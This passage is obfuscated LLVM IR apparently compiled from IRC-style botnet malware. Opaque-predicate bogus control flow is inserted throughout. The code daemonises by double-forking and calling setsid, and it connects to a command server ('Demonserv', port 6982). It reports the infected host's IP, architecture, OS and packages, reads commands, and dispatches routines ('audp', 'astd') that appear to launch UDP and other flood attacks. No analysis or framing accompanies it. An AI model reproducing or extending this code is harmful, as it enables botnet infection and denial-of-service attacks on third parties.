  %828 = load i32, i32* @y.52
  %829 = sub i32 %827, 1
  %830 = mul i32 %827, %829
  %831 = urem i32 %830, 2
  %832 = icmp eq i32 %831, 0
  %833 = icmp slt i32 %828, 10
  %834 = or i1 %832, %833
  br i1 %834, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %826
  %835 = load i32, i32* @x.51
  %836 = load i32, i32* @y.52
  %837 = sub i32 %835, 1
  %838 = mul i32 %835, %837
  %839 = urem i32 %838, 2
  %840 = icmp eq i32 %839, 0
  %841 = icmp slt i32 %836, 10
  %842 = or i1 %840, %841
  br i1 %842, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %843 = alloca i32, align 4
  %844 = alloca i8**, align 8
  %845 = alloca i8*, align 8
  %846 = alloca i32, align 4
  %847 = alloca i32, align 4
  %848 = alloca i32, align 4
  %849 = alloca i32, align 4
  %850 = alloca i32, align 4
  %851 = alloca i8*, align 8
  %852 = alloca i8*, align 8
  %853 = alloca i32, align 4
  %854 = alloca i32, align 4
  %855 = alloca i32, align 4
  %856 = alloca i8*, align 8
  %857 = alloca i32, align 4
  %858 = alloca i32, align 4
  %859 = alloca i8*, align 8
  %860 = alloca i8*, align 8
  %861 = alloca i32, align 4
  %862 = alloca i32, align 4
  %863 = alloca i32, align 4
  %864 = alloca i8*, align 8
  %865 = alloca i32, align 4
  %866 = alloca i64, align 8
  store i32 %0, i32* %843, align 4
  store i8** %1, i8*** %844, align 8
  %867 = load i8**, i8*** %844, align 8
  %868 = getelementptr inbounds i8*, i8** %867, i64 0
  %869 = load i8*, i8** %868, align 8
  %870 = call i32 @strcmp(i8* %869, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.29, i32 0, i32 0)) #10
  %871 = icmp ne i32 %870, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %48
  %872 = load i32, i32* %11, align 4
  %873 = icmp slt i32 %872, 6
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %85
  %874 = load i8**, i8*** %12, align 8
  %875 = getelementptr inbounds i8*, i8** %874, i64 5
  %876 = load i8*, i8** %875, align 8
  %877 = call i32 @atoi(i8* %876) #10
  %878 = icmp eq i32 %877, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %107
  %879 = load i8**, i8*** %12, align 8
  %880 = getelementptr inbounds i8*, i8** %879, i64 5
  %881 = load i8*, i8** %880, align 8
  %882 = call i32 @atoi(i8* %881) #10
  %883 = icmp sgt i32 %882, 65536
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %129
  %884 = load i8**, i8*** %12, align 8
  %885 = getelementptr inbounds i8*, i8** %884, i64 5
  %886 = load i8*, i8** %885, align 8
  %887 = call i32 @atoi(i8* %886) #10
  %888 = icmp sgt i32 %887, 65500
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %166
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %205
  %889 = load i8**, i8*** %12, align 8
  %890 = getelementptr inbounds i8*, i8** %889, i64 6
  %891 = load i8*, i8** %890, align 8
  %892 = call i32 @atoi(i8* %891) #10
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %235
  %893 = load i8*, i8** %19, align 8
  %894 = icmp ne i8* %893, null
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %264
  %895 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %895, i8** %19, align 8
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %282
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %299
  %896 = call i32 @listFork()
  %897 = icmp ne i32 %896, 0
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %318
  %898 = load i8*, i8** %13, align 8
  %899 = load i32, i32* %14, align 4
  %900 = load i32, i32* %15, align 4
  %901 = load i32, i32* %16, align 4
  %902 = load i32, i32* %17, align 4
  %903 = load i32, i32* %18, align 4
  call void @audp(i8* %898, i32 %899, i32 %900, i32 %901, i32 %902, i32 %903)
  call void @_exit(i32 0) #11
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %343
  %904 = load i8**, i8*** %12, align 8
  %905 = getelementptr inbounds i8*, i8** %904, i64 0
  %906 = load i8*, i8** %905, align 8
  %907 = call i32 @strcmp(i8* %906, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.30, i32 0, i32 0)) #10
  %908 = icmp ne i32 %907, 0
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %374
  %909 = load i8**, i8*** %12, align 8
  %910 = getelementptr inbounds i8*, i8** %909, i64 2
  %911 = load i8*, i8** %910, align 8
  %912 = call i32 @atoi(i8* %911) #10
  %913 = icmp eq i32 %912, -1
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %420
  %914 = load i8**, i8*** %12, align 8
  %915 = getelementptr inbounds i8*, i8** %914, i64 7
  %916 = load i8*, i8** %915, align 8
  %917 = call i32 @atoi(i8* %916) #10
  %918 = icmp slt i32 %917, 1
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %474
  %919 = load i8**, i8*** %12, align 8
  %920 = getelementptr inbounds i8*, i8** %919, i64 6
  %921 = load i8*, i8** %920, align 8
  %922 = call i32 @atoi(i8* %921) #10
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %504
  %923 = load i8*, i8** %27, align 8
  %924 = icmp ne i8* %923, null
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %548
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %565
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %597
  %925 = load i8**, i8*** %12, align 8
  %926 = getelementptr inbounds i8*, i8** %925, i64 3
  %927 = load i8*, i8** %926, align 8
  %928 = call i32 @atoi(i8* %927) #10
  %929 = icmp slt i32 %928, 1
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %625
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %664
  %930 = load i8*, i8** %32, align 8
  %931 = icmp ne i8* %930, null
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %686
  %932 = load i8*, i8** %32, align 8
  %933 = load i32, i32* %29, align 4
  %934 = load i32, i32* %30, align 4
  %935 = load i32, i32* %31, align 4
  call void @astd(i8* %932, i32 %933, i32 %934, i32 %935)
  call void @_exit(i32 0) #11
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %707
  %936 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %936, i8** %32, align 8
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %742
  store i32 0, i32* %33, align 4
  store i64 0, i64* %34, align 8
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %788
  %937 = load i32, i32* %33, align 4
  %938 = icmp sgt i32 %937, 0
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %808
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %826
  br label %originalBB106
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #5

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @Demonicsock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @Demonicsock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @Demonicsock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %32

; <label>:15:                                     ; preds = %10
  %16 = load i32, i32* @x.53
  %17 = load i32, i32* @y.54
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  store i32 0, i32* @currentServer, align 4
  %24 = load i32, i32* @x.53
  %25 = load i32, i32* @y.54
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %35

; <label>:32:                                     ; preds = %10
  %33 = load i32, i32* @currentServer, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* @currentServer, align 4
  br label %35

; <label>:35:                                     ; preds = %32, %originalBBpart2
  %36 = load i32, i32* @x.53
  %37 = load i32, i32* @y.54
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %35
  %44 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %45 = load i32, i32* @currentServer, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Demonserv, i64 0, i64 %46
  %48 = load i8*, i8** %47, align 8
  %49 = call i8* @strcpy(i8* %44, i8* %48) #6
  store i32 6982, i32* %3, align 4
  %50 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %51 = call i8* @strchr(i8* %50, i32 58) #10
  %52 = icmp ne i8* %51, null
  %53 = load i32, i32* @x.53
  %54 = load i32, i32* @y.54
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %52, label %61, label %68

; <label>:61:                                     ; preds = %originalBBpart24
  %62 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %63 = call i8* @strchr(i8* %62, i32 58) #10
  %64 = getelementptr inbounds i8, i8* %63, i64 1
  %65 = call i32 @atoi(i8* %64) #10
  store i32 %65, i32* %3, align 4
  %66 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %67 = call i8* @strchr(i8* %66, i32 58) #10
  store i8 0, i8* %67, align 1
  br label %68

; <label>:68:                                     ; preds = %61, %originalBBpart24
  %69 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %69, i32* @Demonicsock, align 4
  %70 = load i32, i32* @Demonicsock, align 4
  %71 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %72 = load i32, i32* %3, align 4
  %73 = call i32 @connectTimeout(i32 %70, i8* %71, i32 %72, i32 30)
  %74 = icmp ne i32 %73, 0
  br i1 %74, label %92, label %75

; <label>:75:                                     ; preds = %68
  %76 = load i32, i32* @x.53
  %77 = load i32, i32* @y.54
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %75
  store i32 1, i32* %1, align 4
  %84 = load i32, i32* @x.53
  %85 = load i32, i32* @y.54
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %93

; <label>:92:                                     ; preds = %68
  store i32 0, i32* %1, align 4
  br label %93

; <label>:93:                                     ; preds = %92, %originalBBpart28
  %94 = load i32, i32* @x.53
  %95 = load i32, i32* @y.54
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %93
  %102 = load i32, i32* %1, align 4
  %103 = load i32, i32* @x.53
  %104 = load i32, i32* @y.54
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret i32 %102

originalBBalteredBB:                              ; preds = %originalBB, %15
  store i32 0, i32* @currentServer, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %35
  %111 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %112 = load i32, i32* @currentServer, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Demonserv, i64 0, i64 %113
  %115 = load i8*, i8** %114, align 8
  %116 = call i8* @strcpy(i8* %111, i8* %115) #6
  store i32 6982, i32* %3, align 4
  %117 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %118 = call i8* @strchr(i8* %117, i32 58) #10
  %119 = icmp ne i8* %118, null
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %75
  store i32 1, i32* %1, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %93
  %120 = load i32, i32* %1, align 4
  br label %originalBB10
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = load i32, i32* @x.55
  %4 = load i32, i32* @y.56
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [4096 x i8], align 16
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca [10 x i8*], align 16
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  store i32 0, i32* %11, align 4
  store i32 %0, i32* %12, align 4
  store i8** %1, i8*** %13, align 8
  %30 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %31 = call i32 @getpid() #6
  %32 = xor i32 %30, %31
  call void @srand(i32 %32) #6
  %33 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %34 = call i32 @getpid() #6
  %35 = xor i32 %33, %34
  call void @init_rand(i32 %35)
  %36 = call i32 @getOurIP()
  %37 = call i32 @fork() #6
  store i32 %37, i32* %14, align 4
  %38 = icmp ne i32 %37, 0
  %39 = load i32, i32* @x.55
  %40 = load i32, i32* @y.56
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %38, label %47, label %50

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = load i32, i32* %14, align 4
  %49 = call i32 @waitpid(i32 %48, i32* %16, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:50:                                     ; preds = %originalBBpart2
  %51 = load i32, i32* %14, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %96, label %53

; <label>:53:                                     ; preds = %50
  %54 = call i32 @fork() #6
  store i32 %54, i32* %15, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %57

; <label>:56:                                     ; preds = %53
  call void @exit(i32 0) #12
  unreachable

; <label>:57:                                     ; preds = %53
  %58 = load i32, i32* @x.55
  %59 = load i32, i32* @y.56
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %57
  %66 = load i32, i32* %15, align 4
  %67 = icmp ne i32 %66, 0
  %68 = load i32, i32* @x.55
  %69 = load i32, i32* @y.56
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %67, label %93, label %76

; <label>:76:                                     ; preds = %originalBBpart28
  %77 = load i32, i32* @x.55
  %78 = load i32, i32* @y.56
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %76
  %85 = load i32, i32* @x.55
  %86 = load i32, i32* @y.56
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %94

; <label>:93:                                     ; preds = %originalBBpart28
  br label %94

; <label>:94:                                     ; preds = %93, %originalBBpart212
  br label %95

; <label>:95:                                     ; preds = %94
  br label %97

; <label>:96:                                     ; preds = %50
  br label %97

; <label>:97:                                     ; preds = %96, %95
  %98 = load i32, i32* @x.55
  %99 = load i32, i32* @y.56
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %97
  %106 = load i32, i32* @x.55
  %107 = load i32, i32* @y.56
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %114

; <label>:114:                                    ; preds = %originalBBpart216
  %115 = load i32, i32* @x.55
  %116 = load i32, i32* @y.56
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %114
  %123 = call i32 @setsid() #6
  %124 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i32 0, i32 0)) #6
  %125 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #6
  %126 = load i32, i32* @x.55
  %127 = load i32, i32* @y.56
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %134

; <label>:134:                                    ; preds = %originalBBpart2158, %153, %originalBBpart220
  %135 = load i32, i32* @x.55
  %136 = load i32, i32* @y.56
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %134
  %143 = call i32 @initConnection()
  %144 = icmp ne i32 %143, 0
  %145 = load i32, i32* @x.55
  %146 = load i32, i32* @y.56
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %144, label %153, label %155

; <label>:153:                                    ; preds = %originalBBpart224
  %154 = call i32 @sleep(i32 5)
  br label %134

; <label>:155:                                    ; preds = %originalBBpart224
  %156 = load i32, i32* @Demonicsock, align 4
  %157 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %158 = call i8* @inet_ntoa(i32 %157) #6
  %159 = call i8* @defarchs()
  %160 = call i8* @defopsys()
  %161 = call i8* @defpkgs()
  %162 = call i32 (i32, i8*, ...) @sockprintf(i32 %156, i8* getelementptr inbounds ([180 x i8], [180 x i8]* @.str.34, i32 0, i32 0), i8* %158, i8* %159, i8* %160, i8* %161)
  store i32 0, i32* %18, align 4
  store i32 0, i32* %19, align 4
  br label %163

; <label>:163:                                    ; preds = %709, %404, %155
  %164 = load i32, i32* @Demonicsock, align 4
  %165 = getelementptr inbounds [4096 x i8], [4096 x i8]* %17, i32 0, i32 0
  %166 = call i32 @recvLine(i32 %164, i8* %165, i32 4096)
  store i32 %166, i32* %18, align 4
  %167 = icmp ne i32 %166, -1
  br i1 %167, label %168, label %710

; <label>:168:                                    ; preds = %163
  store i32 0, i32* %19, align 4
  br label %169

; <label>:169:                                    ; preds = %originalBBpart259, %168
  %170 = load i32, i32* %19, align 4
  %171 = sext i32 %170 to i64
  %172 = load i64, i64* @numpids, align 8
  %173 = icmp ult i64 %171, %172
  br i1 %173, label %174, label %307

; <label>:174:                                    ; preds = %169
  %175 = load i32*, i32** @pids, align 8
  %176 = load i32, i32* %19, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds i32, i32* %175, i64 %177
  %179 = load i32, i32* %178, align 4
  %180 = call i32 @waitpid(i32 %179, i32* null, i32 1)
  %181 = icmp sgt i32 %180, 0
  br i1 %181, label %182, label %287

; <label>:182:                                    ; preds = %174
  %183 = load i32, i32* @x.55
  %184 = load i32, i32* @y.56
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %182
  %191 = load i32, i32* %19, align 4
  %192 = add nsw i32 %191, 1
  store i32 %192, i32* %21, align 4
  %193 = load i32, i32* @x.55
  %194 = load i32, i32* @y.56
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %201

; <label>:201:                                    ; preds = %233, %originalBBpart228
  %202 = load i32, i32* %21, align 4
  %203 = zext i32 %202 to i64
  %204 = load i64, i64* @numpids, align 8
  %205 = icmp ult i64 %203, %204
  br i1 %205, label %206, label %236

; <label>:206:                                    ; preds = %201
  %207 = load i32, i32* @x.55
  %208 = load i32, i32* @y.56
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %206
  %215 = load i32*, i32** @pids, align 8
  %216 = load i32, i32* %21, align 4
  %217 = zext i32 %216 to i64
  %218 = getelementptr inbounds i32, i32* %215, i64 %217
  %219 = load i32, i32* %218, align 4
  %220 = load i32*, i32** @pids, align 8
  %221 = load i32, i32* %21, align 4
  %222 = sub i32 %221, 1
  %223 = zext i32 %222 to i64
  %224 = getelementptr inbounds i32, i32* %220, i64 %223
  store i32 %219, i32* %224, align 4
  %225 = load i32, i32* @x.55
  %226 = load i32, i32* @y.56
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBBpart241, label %originalBB30alteredBB

originalBBpart241:                                ; preds = %originalBB30
  br label %233

; <label>:233:                                    ; preds = %originalBBpart241
  %234 = load i32, i32* %21, align 4
  %235 = add i32 %234, 1
  store i32 %235, i32* %21, align 4
  br label %201

; <label>:236:                                    ; preds = %201
  %237 = load i32*, i32** @pids, align 8
  %238 = load i32, i32* %21, align 4
  %239 = sub i32 %238, 1
  %240 = zext i32 %239 to i64
  %241 = getelementptr inbounds i32, i32* %237, i64 %240
  store i32 0, i32* %241, align 4
  %242 = load i64, i64* @numpids, align 8
  %243 = add i64 %242, -1
  store i64 %243, i64* @numpids, align 8
  %244 = load i64, i64* @numpids, align 8
  %245 = add i64 %244, 1
  %246 = mul i64 %245, 4
  %247 = call noalias i8* @malloc(i64 %246) #6
  %248 = bitcast i8* %247 to i32*
  store i32* %248, i32** %20, align 8
  store i32 0, i32* %21, align 4
  br label %249

; <label>:249:                                    ; preds = %280, %236
  %250 = load i32, i32* %21, align 4
  %251 = zext i32 %250 to i64
  %252 = load i64, i64* @numpids, align 8
  %253 = icmp ult i64 %251, %252
  br i1 %253, label %254, label %283

; <label>:254:                                    ; preds = %249
  %255 = load i32, i32* @x.55
  %256 = load i32, i32* @y.56
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %254
  %263 = load i32*, i32** @pids, align 8
  %264 = load i32, i32* %21, align 4
  %265 = zext i32 %264 to i64
  %266 = getelementptr inbounds i32, i32* %263, i64 %265
  %267 = load i32, i32* %266, align 4
  %268 = load i32*, i32** %20, align 8
  %269 = load i32, i32* %21, align 4
  %270 = zext i32 %269 to i64
  %271 = getelementptr inbounds i32, i32* %268, i64 %270
  store i32 %267, i32* %271, align 4
  %272 = load i32, i32* @x.55
  %273 = load i32, i32* @y.56
  %274 = sub i32 %272, 1
  %275 = mul i32 %272, %274
  %276 = urem i32 %275, 2
  %277 = icmp eq i32 %276, 0
  %278 = icmp slt i32 %273, 10
  %279 = or i1 %277, %278
  br i1 %279, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %280

; <label>:280:                                    ; preds = %originalBBpart245
  %281 = load i32, i32* %21, align 4
  %282 = add i32 %281, 1
  store i32 %282, i32* %21, align 4
  br label %249

; <label>:283:                                    ; preds = %249
  %284 = load i32*, i32** @pids, align 8
  %285 = bitcast i32* %284 to i8*
  call void @free(i8* %285) #6
  %286 = load i32*, i32** %20, align 8
  store i32* %286, i32** @pids, align 8
  br label %287

; <label>:287:                                    ; preds = %283, %174
  br label %288

; <label>:288:                                    ; preds = %287
  %289 = load i32, i32* @x.55
  %290 = load i32, i32* @y.56
  %291 = sub i32 %289, 1
  %292 = mul i32 %289, %291
  %293 = urem i32 %292, 2
  %294 = icmp eq i32 %293, 0
  %295 = icmp slt i32 %290, 10
  %296 = or i1 %294, %295
  br i1 %296, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %288
  %297 = load i32, i32* %19, align 4
  %298 = add nsw i32 %297, 1
  store i32 %298, i32* %19, align 4
  %299 = load i32, i32* @x.55
  %300 = load i32, i32* @y.56
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
